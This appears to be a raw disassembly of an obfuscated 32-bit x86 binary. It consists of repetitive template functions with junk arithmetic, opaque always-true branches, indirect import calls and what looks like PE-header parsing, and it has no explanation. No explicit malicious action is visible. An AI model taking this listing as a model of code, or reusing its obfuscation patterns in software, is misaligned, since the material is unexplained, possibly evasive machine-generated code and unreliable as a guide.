  4d07a1:	add    esp,0x4
  4d07a4:	pop    edx
  4d07a5:	push   edx
  4d07a6:	push   esi
  4d07a7:	push   DWORD PTR [edx+0x154]
  4d07ad:	push   DWORD PTR [edx+0xe0]
  4d07b3:	push   DWORD PTR [edx+0x1a8]
  4d07b9:	call   0x4d1574
  4d07be:	add    esp,0x10
  4d07c1:	pop    edx
  4d07c2:	mov    ecx,0x4d2030
  4d07c7:	mov    ecx,DWORD PTR [ecx]
  4d07c9:	push   ecx
  4d07ca:	push   DWORD PTR [edx-0x17c]
  4d07d0:	pop    edi
  4d07d1:	call   edi
  4d07d3:	add    esp,0x50
  4d07d6:	pop    ebp
  4d07d7:	ret    
  4d07d8:	pop    edi
  4d07d9:	call   DWORD PTR ds:0x4d2010
  4d07df:	call   edi
  4d07e1:	add    BYTE PTR [eax],al
  4d07e3:	add    BYTE PTR [edi-0x1],bl
  4d07e6:	adc    eax,0x4d2068
  4d07eb:	call   edi
  4d07ed:	add    BYTE PTR [eax],al
  4d07ef:	add    BYTE PTR [edi-0x1],bl
  4d07f2:	adc    eax,0x4d2064
  4d07f7:	call   edi
  4d07f9:	add    BYTE PTR [eax],al
  4d07fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0801:	sub    esp,0x5c
  4d0804:	lea    edi,[ebx+0xd8]
  4d080a:	cmp    edi,0x2fb2
  4d0810:	jb     0x4d07ff
  4d0812:	push   edi
  4d0813:	mov    edi,0x0
  4d0818:	push   edi
  4d0819:	call   0x4d11e8
  4d081e:	add    esp,0x4
  4d0821:	pop    edi
  4d0822:	push   edi
  4d0823:	push   DWORD PTR [edi+0x124]
  4d0829:	push   DWORD PTR [edi+0x1c]
  4d082c:	push   DWORD PTR [edi+0x1f4]
  4d0832:	push   eax
  4d0833:	call   0x4d12f8
  4d0838:	add    esp,0x10
  4d083b:	pop    edi
  4d083c:	push   edi
  4d083d:	push   0x0
  4d083f:	call   0x4d0f30
  4d0844:	add    esp,0x4
  4d0847:	pop    edi
  4d0848:	add    esp,0x5c
  4d084b:	pop    ebp
  4d084c:	ret    
  4d084d:	add    BYTE PTR [eax],al
  4d084f:	add    BYTE PTR [edi-0x1],bl
  4d0852:	adc    eax,0x4d208c
  4d0857:	call   edi
  4d0859:	add    BYTE PTR [eax],al
  4d085b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0861:	sub    esp,0x34
  4d0864:	lea    ebx,ds:0x4d30ac
  4d086a:	adc    edi,edx
  4d086c:	push   0x0
  4d086e:	call   0x4d15dc
  4d0873:	add    esp,0x4
  4d0876:	push   ebx
  4d0877:	push   edi
  4d0878:	push   esi
  4d0879:	push   edx
  4d087a:	call   0x4d1018
  4d087f:	add    esp,0xc
  4d0882:	pop    ebx
  4d0883:	call   0x4d0998
  4d0888:	add    esp,0x4
  4d088b:	add    esp,0x34
  4d088e:	pop    ebp
  4d088f:	ret    
  4d0890:	mov    edi,edi
  4d0892:	push   ebp
  4d0893:	mov    ebp,esp
  4d0895:	sub    esp,0x34
  4d0898:	lea    edx,ds:0x4d3080
  4d089e:	cmp    edx,0x3f5a
  4d08a4:	jb     0x4d0893
  4d08a6:	push   edx
  4d08a7:	push   DWORD PTR [edx+0x58]
  4d08aa:	push   ecx
  4d08ab:	push   DWORD PTR [edx+0xb4]
  4d08b1:	push   edi
  4d08b2:	call   0x4d0dfc
  4d08b7:	add    esp,0x10
  4d08ba:	pop    edx
  4d08bb:	push   edx
  4d08bc:	mov    ebx,0x0
  4d08c1:	push   ebx
  4d08c2:	call   0x4d12e0
  4d08c7:	add    esp,0x4
  4d08ca:	pop    edx
  4d08cb:	push   edx
  4d08cc:	mov    ecx,0x0
  4d08d1:	push   ecx
  4d08d2:	call   0x4d092c
  4d08d7:	add    esp,0x4
  4d08da:	pop    edx
  4d08db:	add    esp,0x34
  4d08de:	pop    ebp
  4d08df:	ret    
  4d08e0:	mov    edi,edi
  4d08e2:	push   ebp
  4d08e3:	mov    ebp,esp
  4d08e5:	sub    esp,0x58
  4d08e8:	lea    esi,ds:0x4d3158
  4d08ee:	adc    ecx,DWORD PTR [ebp-0x34]
  4d08f1:	push   esi
  4d08f2:	push   DWORD PTR [esi+0x170]
  4d08f8:	push   edx
  4d08f9:	call   0x4d1358
  4d08fe:	add    esp,0x8
  4d0901:	pop    esi
  4d0902:	mov    eax,0x0
  4d0907:	push   eax
  4d0908:	call   0x4d1340
  4d090d:	add    esp,0x4
  4d0910:	push   0x0
  4d0912:	call   0x4d11e8
  4d0917:	add    esp,0x4
  4d091a:	add    esp,0x58
  4d091d:	pop    ebp
  4d091e:	ret    
  4d091f:	add    BYTE PTR [edi-0x1],bl
  4d0922:	adc    eax,0x4d2094
  4d0927:	call   edi
  4d0929:	add    BYTE PTR [eax],al
  4d092b:	add    BYTE PTR [edi-0x1],bl
  4d092e:	adc    eax,0x4d201c
  4d0933:	call   edi
  4d0935:	add    BYTE PTR [eax],al
  4d0937:	add    BYTE PTR [edi-0x1],bl
  4d093a:	adc    eax,0x4d2004
  4d093f:	call   edi
  4d0941:	add    BYTE PTR [eax],al
  4d0943:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0949:	sub    esp,0x58
  4d094c:	lea    eax,[edi+0x8]
  4d094f:	sub    esi,DWORD PTR [ebp-0x28]
  4d0952:	push   eax
  4d0953:	mov    esi,0xfffffff4
  4d0958:	push   esi
  4d0959:	call   0x4d0b9c
  4d095e:	add    esp,0x4
  4d0961:	pop    eax
  4d0962:	push   eax
  4d0963:	push   esi
  4d0964:	push   edx
  4d0965:	push   DWORD PTR [eax+0x88]
  4d096b:	push   edi
  4d096c:	call   0x4d0ea4
  4d0971:	add    esp,0x10
  4d0974:	pop    eax
  4d0975:	push   eax
  4d0976:	mov    ebx,0x0
  4d097b:	push   ebx
  4d097c:	call   0x4d0f30
  4d0981:	add    esp,0x4
  4d0984:	pop    eax
  4d0985:	add    esp,0x58
  4d0988:	pop    ebp
  4d0989:	ret    
  4d098a:	add    BYTE PTR [eax],al
  4d098c:	pop    edi
  4d098d:	call   DWORD PTR ds:0x4d2028
  4d0993:	call   edi
  4d0995:	add    BYTE PTR [eax],al
  4d0997:	add    BYTE PTR [edi-0x1],bl
  4d099a:	adc    eax,0x4d2014
  4d099f:	call   edi
  4d09a1:	add    BYTE PTR [eax],al
  4d09a3:	add    BYTE PTR [edi-0x1],bl
  4d09a6:	adc    eax,0x4d209c
  4d09ab:	call   edi
  4d09ad:	add    BYTE PTR [eax],al
  4d09af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09b5:	sub    esp,0x24
  4d09b8:	lea    ebx,ds:0x4d31ec
  4d09be:	add    ecx,0xffffffeb
  4d09c1:	mov    edi,0x0
  4d09c6:	push   edi
  4d09c7:	call   0x4d12e0
  4d09cc:	add    esp,0x4
  4d09cf:	push   ebx
  4d09d0:	push   esi
  4d09d1:	push   DWORD PTR [ebx+0x1b4]
  4d09d7:	push   DWORD PTR [ebx+0xb0]
  4d09dd:	call   0x4d0c54
  4d09e2:	add    esp,0xc
  4d09e5:	pop    ebx
  4d09e6:	mov    ecx,0x0
  4d09eb:	push   ecx
  4d09ec:	call   0x4d07d8
  4d09f1:	add    esp,0x4
  4d09f4:	add    esp,0x24
  4d09f7:	pop    ebp
  4d09f8:	ret    
  4d09f9:	add    BYTE PTR [eax],al
  4d09fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a01:	sub    esp,0x1c
  4d0a04:	mov    eax,0x4d3184
  4d0a09:	cmp    eax,0x4f09
  4d0a0e:	jbe    0x4d09ff
  4d0a10:	push   eax
  4d0a11:	call   0x4d0998
  4d0a16:	add    esp,0x4
  4d0a19:	pop    eax
  4d0a1a:	push   eax
  4d0a1b:	push   edx
  4d0a1c:	push   DWORD PTR [eax+0x5c]
  4d0a1f:	call   0x4d085c
  4d0a24:	add    esp,0x8
  4d0a27:	pop    eax
  4d0a28:	push   eax
  4d0a29:	call   0x4d0938
  4d0a2e:	add    esp,0x4
  4d0a31:	pop    eax
  4d0a32:	add    esp,0x1c
  4d0a35:	pop    ebp
  4d0a36:	ret    
  4d0a37:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a3d:	sub    esp,0x3c
  4d0a40:	lea    edi,ds:0x4d31fc
  4d0a46:	sub    edx,DWORD PTR [edi-0x1b4]
  4d0a4c:	push   edi
  4d0a4d:	call   0x4d0938
  4d0a52:	add    esp,0x4
  4d0a55:	pop    edi
  4d0a56:	push   edi
  4d0a57:	push   esi
  4d0a58:	push   DWORD PTR [edi+0xb0]
  4d0a5e:	push   esi
  4d0a5f:	push   eax
  4d0a60:	call   0x4d110c
  4d0a65:	add    esp,0x10
  4d0a68:	pop    edi
  4d0a69:	push   edi
  4d0a6a:	push   0x0
  4d0a6c:	call   0x4d0bfc
  4d0a71:	add    esp,0x4
  4d0a74:	pop    edi
  4d0a75:	add    esp,0x3c
  4d0a78:	pop    ebp
  4d0a79:	ret    
  4d0a7a:	add    BYTE PTR [eax],al
  4d0a7c:	mov    edi,edi
  4d0a7e:	push   ebp
  4d0a7f:	mov    ebp,esp
  4d0a81:	sub    esp,0x20
  4d0a84:	lea    edi,[edx+0x15c]
  4d0a8a:	xor    DWORD PTR [edi-0x10c],esi
  4d0a90:	push   edi
  4d0a91:	push   DWORD PTR [edi+0x16c]
  4d0a97:	push   DWORD PTR [edi+0x194]
  4d0a9d:	call   0x4d11f4
  4d0aa2:	add    esp,0x8
  4d0aa5:	pop    edi
  4d0aa6:	push   edi
  4d0aa7:	push   0x0
  4d0aa9:	call   0x4d134c
  4d0aae:	add    esp,0x4
  4d0ab1:	pop    edi
  4d0ab2:	push   edi
  4d0ab3:	mov    edi,0x0
  4d0ab8:	push   edi
  4d0ab9:	call   0x4d0bfc
  4d0abe:	add    esp,0x4
  4d0ac1:	pop    edi
  4d0ac2:	add    esp,0x20
  4d0ac5:	pop    ebp
  4d0ac6:	ret    
  4d0ac7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0acd:	sub    esp,0x4c
  4d0ad0:	lea    ecx,[ebx-0x30]
  4d0ad3:	xor    edx,DWORD PTR [ebp-0x44]
  4d0ad6:	push   ecx
  4d0ad7:	mov    eax,0x0
  4d0adc:	push   eax
  4d0add:	call   0x4d134c
  4d0ae2:	add    esp,0x4
  4d0ae5:	pop    ecx
  4d0ae6:	push   ecx
  4d0ae7:	push   ebx
  4d0ae8:	push   edi
  4d0ae9:	call   0x4d09fc
  4d0aee:	add    esp,0x8
  4d0af1:	pop    ecx
  4d0af2:	push   ecx
  4d0af3:	mov    ebx,0x0
  4d0af8:	push   ebx
  4d0af9:	call   0x4d07d8
  4d0afe:	add    esp,0x4
  4d0b01:	pop    ecx
  4d0b02:	add    esp,0x4c
  4d0b05:	pop    ebp
  4d0b06:	ret    
  4d0b07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b0d:	sub    esp,0x5c
  4d0b10:	lea    edi,ds:0x4d307c
  4d0b16:	adc    DWORD PTR [edi+0x10c],0xffffffaf
  4d0b1d:	push   edi
  4d0b1e:	mov    edi,0x0
  4d0b23:	push   edi
  4d0b24:	call   0x4d0f30
  4d0b29:	add    esp,0x4
  4d0b2c:	pop    edi
  4d0b2d:	push   edi
  4d0b2e:	push   esi
  4d0b2f:	push   ebx
  4d0b30:	call   0x4d0944
  4d0b35:	add    esp,0x8
  4d0b38:	pop    edi
  4d0b39:	push   edi
  4d0b3a:	push   0x0
  4d0b3c:	call   0x4d12e0
  4d0b41:	add    esp,0x4
  4d0b44:	pop    edi
  4d0b45:	add    esp,0x5c
  4d0b48:	pop    ebp
  4d0b49:	ret    
  4d0b4a:	add    BYTE PTR [eax],al
  4d0b4c:	mov    edi,edi
  4d0b4e:	push   ebp
  4d0b4f:	mov    ebp,esp
  4d0b51:	sub    esp,0x1c
  4d0b54:	lea    edx,ds:0x4d309c
  4d0b5a:	cmp    edx,0x844
  4d0b60:	jb     0x4d0b4f
  4d0b62:	push   edx
  4d0b63:	push   0xfffffff4
  4d0b65:	call   0x4d0b9c
  4d0b6a:	add    esp,0x4
  4d0b6d:	pop    edx
  4d0b6e:	push   edx
  4d0b6f:	push   DWORD PTR [edx+0x150]
  4d0b75:	push   DWORD PTR [edx+0x84]
  4d0b7b:	push   esi
  4d0b7c:	push   DWORD PTR [edx+0x1e4]
  4d0b82:	call   0x4d06ec
  4d0b87:	add    esp,0x10
  4d0b8a:	pop    edx
  4d0b8b:	push   edx
  4d0b8c:	push   0xfffffff4
  4d0b8e:	call   0x4d0b9c
  4d0b93:	add    esp,0x4
  4d0b96:	pop    edx
  4d0b97:	add    esp,0x1c
  4d0b9a:	pop    ebp
  4d0b9b:	ret    
  4d0b9c:	pop    edi
  4d0b9d:	call   DWORD PTR ds:0x4d2048
  4d0ba3:	call   edi
  4d0ba5:	add    BYTE PTR [eax],al
  4d0ba7:	add    BYTE PTR [edi-0x1],bl
  4d0baa:	adc    eax,0x4d2018
  4d0baf:	call   edi
  4d0bb1:	add    BYTE PTR [eax],al
  4d0bb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bb9:	sub    esp,0x20
  4d0bbc:	lea    edi,[ecx-0x10]
  4d0bbf:	sub    DWORD PTR [edi-0x9c],0x45ce
  4d0bc9:	push   edi
  4d0bca:	push   DWORD PTR [edi+0x184]
  4d0bd0:	push   ebx
  4d0bd1:	call   0x4d0f84
  4d0bd6:	add    esp,0x8
  4d0bd9:	pop    edi
  4d0bda:	push   edi
  4d0bdb:	push   0x0
  4d0bdd:	call   0x4d134c
  4d0be2:	add    esp,0x4
  4d0be5:	pop    edi
  4d0be6:	push   edi
  4d0be7:	mov    edx,0xfffffff4
  4d0bec:	push   edx
  4d0bed:	call   0x4d0b9c
  4d0bf2:	add    esp,0x4
  4d0bf5:	pop    edi
  4d0bf6:	add    esp,0x20
  4d0bf9:	pop    ebp
  4d0bfa:	ret    
  4d0bfb:	add    BYTE PTR [edi-0x1],bl
  4d0bfe:	adc    eax,0x4d2078
  4d0c03:	call   edi
  4d0c05:	add    BYTE PTR [eax],al
  4d0c07:	add    BYTE PTR [edi+0x2b],dl
  4d0c0a:	call   DWORD PTR [edi+0x57]
  4d0c0d:	push   edi
  4d0c0e:	push   edi
  4d0c0f:	call   0x4d0998
  4d0c14:	sub    esp,0xfffffffc
  4d0c17:	call   0x4d0e98
  4d0c1c:	push   0x2
  4d0c1e:	xor    eax,eax
  4d0c20:	adc    eax,0x4d3030
  4d0c25:	push   0x0
  4d0c27:	xor    ecx,ecx
  4d0c29:	adc    ecx,0x4d3036
  4d0c2f:	add    BYTE PTR [ecx],0x41
  4d0c32:	push   eax
  4d0c33:	call   0x4d098c
  4d0c38:	pop    edi
  4d0c39:	pop    edi
  4d0c3a:	pop    edi
  4d0c3b:	lea    edi,[eax+0x3b]
  4d0c3e:	mov    edi,DWORD PTR [edi]
  4d0c40:	lea    eax,[eax+edi*1]
  4d0c43:	mov    eax,DWORD PTR [eax+0x28]
  4d0c46:	pusha  
  4d0c47:	mov    ah,0x45
  4d0c49:	sub    al,ah
  4d0c4b:	ja     0x4d0788
  4d0c51:	popa   
  4d0c52:	ret    
  4d0c53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c59:	sub    esp,0x4c
  4d0c5c:	lea    esi,ds:0x4d309c
  4d0c62:	or     DWORD PTR [esi+0xcc],0xffffb54a
  4d0c6c:	push   esi
  4d0c6d:	push   eax
  4d0c6e:	push   edi
  4d0c6f:	push   ebx
  4d0c70:	call   0x4d115c
  4d0c75:	add    esp,0xc
  4d0c78:	pop    esi
  4d0c79:	call   0x4d0da4
  4d0c7e:	add    esp,0x4
  4d0c81:	push   0x0
  4d0c83:	call   0x4d15dc
  4d0c88:	add    esp,0x4
  4d0c8b:	add    esp,0x4c
  4d0c8e:	pop    ebp
  4d0c8f:	ret    
  4d0c90:	pop    edi
  4d0c91:	call   DWORD PTR ds:0x4d2058
  4d0c97:	call   edi
  4d0c99:	add    BYTE PTR [eax],al
  4d0c9b:	add    BYTE PTR [edi-0x1],bl
  4d0c9e:	adc    eax,0x4d2070
  4d0ca3:	call   edi
  4d0ca5:	add    BYTE PTR [eax],al
  4d0ca7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cad:	sub    esp,0x44
  4d0cb0:	lea    ecx,ds:0x4d31cc
  4d0cb6:	add    DWORD PTR [ecx-0x9c],0x61
  4d0cbd:	push   ecx
  4d0cbe:	push   eax
  4d0cbf:	push   ebx
  4d0cc0:	push   DWORD PTR [ecx+0x178]
  4d0cc6:	call   0x4d0bb4
  4d0ccb:	add    esp,0xc
  4d0cce:	pop    ecx
  4d0ccf:	push   ecx
  4d0cd0:	mov    eax,0x0
  4d0cd5:	push   eax
  4d0cd6:	call   0x4d1340
  4d0cdb:	add    esp,0x4
  4d0cde:	pop    ecx
  4d0cdf:	push   ecx
  4d0ce0:	lea    ebx,[ecx-0x1cc]
  4d0ce6:	push   ebx
  4d0ce7:	call   0x4d143c
  4d0cec:	add    esp,0x4
  4d0cef:	test   eax,eax
  4d0cf1:	jne    0x4d0ce0
  4d0cf3:	pop    ecx
  4d0cf4:	add    esp,0x44
  4d0cf7:	pop    ebp
  4d0cf8:	ret    
  4d0cf9:	add    BYTE PTR [eax],al
  4d0cfb:	add    BYTE PTR [edi-0x1],bl
  4d0cfe:	adc    eax,0x4d20a0
  4d0d03:	call   edi
  4d0d05:	add    BYTE PTR [eax],al
  4d0d07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d0d:	sub    esp,0x20
  4d0d10:	lea    ebx,[ecx+0x10c]
  4d0d16:	add    DWORD PTR [ebx-0x2c],0x27db
  4d0d1d:	push   ebx
  4d0d1e:	push   DWORD PTR [ebx+0x1b4]
  4d0d24:	push   eax
  4d0d25:	call   0x4d08e0
  4d0d2a:	add    esp,0x8
  4d0d2d:	pop    ebx
  4d0d2e:	mov    edx,0x0
  4d0d33:	push   edx
  4d0d34:	call   0x4d0f30
  4d0d39:	add    esp,0x4
  4d0d3c:	push   0x0
  4d0d3e:	call   0x4d092c
  4d0d43:	add    esp,0x4
  4d0d46:	add    esp,0x20
  4d0d49:	pop    ebp
  4d0d4a:	ret    
  4d0d4b:	add    BYTE PTR [edi-0x1],bl
  4d0d4e:	adc    eax,0x4d202c
  4d0d53:	call   edi
  4d0d55:	add    BYTE PTR [eax],al
  4d0d57:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d5d:	sub    esp,0x4c
  4d0d60:	lea    esi,ds:0x4d3054
  4d0d66:	adc    eax,0xffffffe0
  4d0d69:	mov    edi,0x0
  4d0d6e:	push   edi
  4d0d6f:	call   0x4d07d8
  4d0d74:	add    esp,0x4
  4d0d77:	push   esi
  4d0d78:	push   ecx
  4d0d79:	push   DWORD PTR [esi+0x108]
  4d0d7f:	push   DWORD PTR [esi+0x88]
  4d0d85:	push   edx
  4d0d86:	call   0x4d0ca8
  4d0d8b:	add    esp,0x10
  4d0d8e:	pop    esi
  4d0d8f:	mov    edi,0x0
  4d0d94:	push   edi
  4d0d95:	call   0x4d15dc
  4d0d9a:	add    esp,0x4
  4d0d9d:	add    esp,0x4c
  4d0da0:	pop    ebp
  4d0da1:	ret    
  4d0da2:	add    BYTE PTR [eax],al
  4d0da4:	pop    edi
  4d0da5:	call   DWORD PTR ds:0x4d2008
  4d0dab:	call   edi
  4d0dad:	add    BYTE PTR [eax],al
  4d0daf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db5:	sub    esp,0x58
  4d0db8:	mov    esi,0x4d30f0
  4d0dbd:	adc    eax,0xffffebc5
  4d0dc2:	push   0x0
  4d0dc4:	call   0x4d0bfc
  4d0dc9:	add    esp,0x4
  4d0dcc:	push   esi
  4d0dcd:	push   ecx
  4d0dce:	push   DWORD PTR [esi+0x1a8]
  4d0dd4:	push   DWORD PTR [esi+0x174]
  4d0dda:	push   edi
  4d0ddb:	call   0x4d0eec
  4d0de0:	add    esp,0x10
  4d0de3:	pop    esi
  4d0de4:	lea    edi,[esi-0xf0]
  4d0dea:	push   edi
  4d0deb:	call   0x4d143c
  4d0df0:	add    esp,0x4
  4d0df3:	test   eax,eax
  4d0df5:	jne    0x4d0de5
  4d0df7:	add    esp,0x58
  4d0dfa:	pop    ebp
  4d0dfb:	ret    
  4d0dfc:	mov    edi,edi
  4d0dfe:	push   ebp
  4d0dff:	mov    ebp,esp
  4d0e01:	sub    esp,0x48
  4d0e04:	lea    esi,ds:0x4d306c
  4d0e0a:	and    DWORD PTR [ebp-0x34],edi
  4d0e0d:	push   esi
  4d0e0e:	push   edx
  4d0e0f:	push   DWORD PTR [esi+0x194]
  4d0e15:	push   DWORD PTR [esi+0x90]
  4d0e1b:	push   ecx
  4d0e1c:	call   0x4d1534
  4d0e21:	add    esp,0x10
  4d0e24:	pop    esi
  4d0e25:	lea    eax,[esi-0x6c]
  4d0e28:	push   eax
  4d0e29:	call   0x4d143c
  4d0e2e:	add    esp,0x4
  4d0e31:	test   eax,eax
  4d0e33:	jne    0x4d0e26
  4d0e35:	push   0x0
  4d0e37:	call   0x4d077c
  4d0e3c:	add    esp,0x4
  4d0e3f:	add    esp,0x48
  4d0e42:	pop    ebp
  4d0e43:	ret    
  4d0e44:	pop    edi
  4d0e45:	call   DWORD PTR ds:0x4d2054
  4d0e4b:	call   edi
  4d0e4d:	add    BYTE PTR [eax],al
  4d0e4f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e55:	sub    esp,0x60
  4d0e58:	mov    edx,0x4d31fc
  4d0e5d:	or     DWORD PTR [edx-0x128],edi
  4d0e63:	push   edx
  4d0e64:	push   ecx
  4d0e65:	push   ecx
  4d0e66:	push   edi
  4d0e67:	push   esi
  4d0e68:	call   0x4d09b0
  4d0e6d:	add    esp,0x10
  4d0e70:	pop    edx
  4d0e71:	push   edx
  4d0e72:	push   0x0
  4d0e74:	call   0x4d12e0
  4d0e79:	add    esp,0x4
  4d0e7c:	pop    edx
  4d0e7d:	push   edx
  4d0e7e:	call   0x4d0938
  4d0e83:	add    esp,0x4
  4d0e86:	pop    edx
  4d0e87:	add    esp,0x60
  4d0e8a:	pop    ebp
  4d0e8b:	ret    
  4d0e8c:	pop    edi
  4d0e8d:	call   DWORD PTR ds:0x4d2090
  4d0e93:	call   edi
  4d0e95:	add    BYTE PTR [eax],al
  4d0e97:	add    BYTE PTR [edi-0x1],bl
  4d0e9a:	adc    eax,0x4d2024
  4d0e9f:	call   edi
  4d0ea1:	add    BYTE PTR [eax],al
  4d0ea3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ea9:	sub    esp,0x4c
  4d0eac:	mov    ecx,0x4d31a0
  4d0eb1:	cmp    ecx,0x7b14
  4d0eb7:	jbe    0x4d0ea7
  4d0eb9:	push   ecx
  4d0eba:	mov    edx,0x0
  4d0ebf:	push   edx
  4d0ec0:	call   0x4d0bfc
  4d0ec5:	add    esp,0x4
  4d0ec8:	pop    ecx
  4d0ec9:	push   ecx
  4d0eca:	push   esi
  4d0ecb:	push   esi
  4d0ecc:	push   edi
  4d0ecd:	call   0x4d0f3c
  4d0ed2:	add    esp,0xc
  4d0ed5:	pop    ecx
  4d0ed6:	push   ecx
  4d0ed7:	mov    ebx,0x0
  4d0edc:	push   ebx
  4d0edd:	call   0x4d0bfc
  4d0ee2:	add    esp,0x4
  4d0ee5:	pop    ecx
  4d0ee6:	add    esp,0x4c
  4d0ee9:	pop    ebp
  4d0eea:	ret    
  4d0eeb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ef1:	sub    esp,0x20
  4d0ef4:	lea    ecx,[esi+0x18]
  4d0ef7:	mov    edi,DWORD PTR [ebp-0x10]
  4d0efa:	push   ecx
  4d0efb:	push   eax
  4d0efc:	push   DWORD PTR [ecx+0x74]
  4d0eff:	push   DWORD PTR [ecx+0x144]
  4d0f05:	push   esi
  4d0f06:	call   0x4d10cc
  4d0f0b:	add    esp,0x10
  4d0f0e:	pop    ecx
  4d0f0f:	push   ecx
  4d0f10:	call   0x4d0da4
  4d0f15:	add    esp,0x4
  4d0f18:	pop    ecx
  4d0f19:	push   ecx
  4d0f1a:	mov    ecx,0x0
  4d0f1f:	push   ecx
  4d0f20:	call   0x4d077c
  4d0f25:	add    esp,0x4
  4d0f28:	pop    ecx
  4d0f29:	add    esp,0x20
  4d0f2c:	pop    ebp
  4d0f2d:	ret    
  4d0f2e:	add    BYTE PTR [eax],al
  4d0f30:	pop    edi
  4d0f31:	call   DWORD PTR ds:0x4d2034
  4d0f37:	call   edi
  4d0f39:	add    BYTE PTR [eax],al
  4d0f3b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f41:	sub    esp,0x28
  4d0f44:	lea    esi,ds:0x4d3038
  4d0f4a:	cmp    esi,0x5c5
  4d0f50:	jb     0x4d0f3f
  4d0f52:	push   esi
  4d0f53:	push   edi
  4d0f54:	push   edi
  4d0f55:	push   DWORD PTR [esi+0x198]
  4d0f5b:	call   0x4d107c
  4d0f60:	add    esp,0xc
  4d0f63:	pop    esi
  4d0f64:	lea    ecx,[esi-0x38]
  4d0f67:	push   ecx
  4d0f68:	call   0x4d143c
  4d0f6d:	add    esp,0x4
  4d0f70:	test   eax,eax
  4d0f72:	jne    0x4d0f65
  4d0f74:	call   0x4d0998
  4d0f79:	add    esp,0x4
  4d0f7c:	add    esp,0x28
  4d0f7f:	pop    ebp
  4d0f80:	ret    
  4d0f81:	add    BYTE PTR [eax],al
  4d0f83:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f89:	sub    esp,0x58
  4d0f8c:	mov    esi,0x4d3064
  4d0f91:	and    edx,0xffffd8e0
  4d0f97:	push   esi
  4d0f98:	push   ebx
  4d0f99:	push   ebx
  4d0f9a:	call   0x4d1454
  4d0f9f:	add    esp,0x8
  4d0fa2:	pop    esi
  4d0fa3:	call   0x4d0998
  4d0fa8:	add    esp,0x4
  4d0fab:	push   0x0
  4d0fad:	call   0x4d077c
  4d0fb2:	add    esp,0x4
  4d0fb5:	add    esp,0x58
  4d0fb8:	pop    ebp
  4d0fb9:	ret    
  4d0fba:	add    BYTE PTR [eax],al
  4d0fbc:	mov    edi,edi
  4d0fbe:	push   ebp
  4d0fbf:	mov    ebp,esp
  4d0fc1:	sub    esp,0x48
  4d0fc4:	lea    esi,ds:0x4d300c
  4d0fca:	add    DWORD PTR [ebp-0x24],edi
  4d0fcd:	mov    ecx,0x0
  4d0fd2:	push   ecx
  4d0fd3:	call   0x4d1340
  4d0fd8:	add    esp,0x4
  4d0fdb:	push   esi
  4d0fdc:	push   DWORD PTR [esi+0x164]
  4d0fe2:	push   DWORD PTR [esi+0x90]
  4d0fe8:	push   DWORD PTR [esi+0x118]
  4d0fee:	push   edi
  4d0fef:	call   0x4d0b4c
  4d0ff4:	add    esp,0x10
  4d0ff7:	pop    esi
  4d0ff8:	mov    eax,0xfffffff4
  4d0ffd:	push   eax
  4d0ffe:	call   0x4d0b9c
  4d1003:	add    esp,0x4
  4d1006:	add    esp,0x48
  4d1009:	pop    ebp
  4d100a:	ret    
  4d100b:	add    BYTE PTR [edi-0x1],bl
  4d100e:	adc    eax,0x4d2098
  4d1013:	call   edi
  4d1015:	add    BYTE PTR [eax],al
  4d1017:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d101d:	sub    esp,0x34
  4d1020:	lea    ecx,[ebx+0x114]
  4d1026:	cmp    ecx,0x3fb7
  4d102c:	jbe    0x4d101b
  4d102e:	push   ecx
  4d102f:	push   DWORD PTR [ecx+0xd4]
  4d1035:	push   DWORD PTR [ecx+0xd4]
  4d103b:	push   DWORD PTR [ecx+0x17c]
  4d1041:	push   DWORD PTR [ecx+0x184]
  4d1047:	call   0x4d0734
  4d104c:	add    esp,0x10
  4d104f:	pop    ecx
  4d1050:	push   ecx
  4d1051:	mov    eax,0x0
  4d1056:	push   eax
  4d1057:	call   0x4d12e0
  4d105c:	add    esp,0x4
  4d105f:	pop    ecx
  4d1060:	push   ecx
  4d1061:	call   0x4d0998
  4d1066:	add    esp,0x4
  4d1069:	pop    ecx
  4d106a:	add    esp,0x34
  4d106d:	pop    ebp
  4d106e:	ret    
  4d106f:	add    BYTE PTR [edi-0x1],bl
  4d1072:	adc    eax,0x4d2000
  4d1077:	call   edi
  4d1079:	add    BYTE PTR [eax],al
  4d107b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1081:	sub    esp,0x5c
  4d1084:	lea    ebx,[esi+0x3c]
  4d1087:	sub    edi,ecx
  4d1089:	lea    edi,[ebx-0x74]
  4d108c:	push   edi
  4d108d:	call   0x4d143c
  4d1092:	add    esp,0x4
  4d1095:	test   eax,eax
  4d1097:	jne    0x4d108a
  4d1099:	push   ebx
  4d109a:	push   DWORD PTR [ebx+0x74]
  4d109d:	push   ecx
  4d109e:	push   DWORD PTR [ebx+0xa4]
  4d10a4:	push   ecx
  4d10a5:	call   0x4d07fc
  4d10aa:	add    esp,0x10
  4d10ad:	pop    ebx
  4d10ae:	push   0x0
  4d10b0:	call   0x4d0f30
  4d10b5:	add    esp,0x4
  4d10b8:	add    esp,0x5c
  4d10bb:	pop    ebp
  4d10bc:	ret    
  4d10bd:	add    BYTE PTR [eax],al
  4d10bf:	add    BYTE PTR [edi-0x1],bl
  4d10c2:	adc    eax,0x4d2020
  4d10c7:	call   edi
  4d10c9:	add    BYTE PTR [eax],al
  4d10cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10d1:	sub    esp,0x5c
  4d10d4:	lea    esi,ds:0x4d31c8
  4d10da:	add    ecx,DWORD PTR [ebp-0x44]
  4d10dd:	call   0x4d0da4
  4d10e2:	add    esp,0x4
